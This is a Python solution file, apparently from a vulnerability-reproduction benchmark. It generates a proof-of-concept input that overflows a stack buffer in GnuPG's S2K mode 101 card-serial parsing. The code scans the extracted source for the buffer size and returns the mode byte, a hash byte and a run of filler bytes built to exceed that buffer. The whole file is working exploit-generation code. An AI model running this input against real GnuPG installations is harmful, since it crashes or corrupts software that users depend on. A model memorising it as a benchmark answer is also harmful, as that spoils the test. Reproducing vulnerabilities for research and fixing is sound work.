import os
import tarfile
import tempfile
import shutil
import re

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability corresponds to a stack buffer overflow when parsing 
        GnuPG S2K (Mode 101/0x65) card serial numbers.
        """
        # Default configuration derived from ground truth (27 bytes)
        # Structure: [Mode: 1 byte] [Hash Algo: 1 byte] [Serial/Data: N bytes]
        # 1 + 1 + 25 = 27 bytes
        poc_mode = 0x65  # GnuPG S2K extension mode
        poc_hash = 0x08  # SHA256 (common algo)
        payload_len = 25 # Default payload length to match GT
        
        temp_dir = tempfile.mkdtemp()
        
        try:
            # Extract source code to analyze buffer size
            if tarfile.is_tarfile(src_path):
                with tarfile.open(src_path) as tar:
                    tar.extractall(path=temp_dir)
            
            found_size = None
            
            # Walk through source files to locate the vulnerable buffer
            for root, dirs, files in os.walk(temp_dir):
                for file in files:
                    if file.endswith('.c'):
                        fpath = os.path.join(root, file)
                        try:
                            with open(fpath, 'r', encoding='latin-1') as f:
                                content = f.read()
                        except Exception:
                            continue
                        
                        # Search for GnuPG S2K mode handling (101 or 0x65)
                        # We look for code blocks checking for this mode
                        if '101' in content or '0x65' in content:
                            matches = list(re.finditer(r'(?:case\s+(?:101|0x65)|mode\s*==\s*(?:101|0x65))', content))
                            
                            if matches:
                                for m in matches:
                                    # Examine the surrounding code for stack buffer declarations
                                    start = max(0, m.start() - 500)
                                    end = min(len(content), m.end() + 2000)
                                    chunk = content[start:end]
                                    
                                    # Regex to find buffer declarations like "char buf[16];" or "unsigned char serial[12];"
                                    # Matches types: char, u8, byte, unsigned char, uint8_t
                                    buf_matches = re.finditer(r'(?:char|u8|byte|uint8_t|unsigned\s+char)\s+(\w+)\s*\[\s*(\d+)\s*\]', chunk)
                                    
                                    candidates = []
                                    for bm in buf_matches:
                                        bname = bm.group(1)
                                        bsize = int(bm.group(2))
                                        # Filter for likely targets (small buffers typically used for serials)
                                        if 4 <= bsize <= 64:
                                            candidates.append((bsize, bname))
                                    
                                    if candidates:
                                        # Prioritize buffers named 'serial' as per vulnerability description
                                        candidates.sort(key=lambda x: 0 if 'serial' in x[1] else 1)
                                        found_size = candidates[0][0]
                                        break
                                if found_size:
                                    break
                if found_size:
                    break
            
            if found_size:
                # If we found the specific buffer size, customize the payload length.
                # We need enough overflow to trigger ASAN (size + 1 minimum).
                # Adding 8 bytes ensures we corrupt saved registers/canaries reliably.
                payload_len = found_size + 8

        except Exception:
            # Fallback to default if analysis fails
            pass
        finally:
            shutil.rmtree(temp_dir, ignore_errors=True)
            
        # Construct the PoC input
        # Byte 0: Mode (0x65)
        # Byte 1: Hash Algorithm (0x08)
        # Bytes 2+: Overflow payload
        return bytes([poc_mode, poc_hash]) + b'A' * payload_len
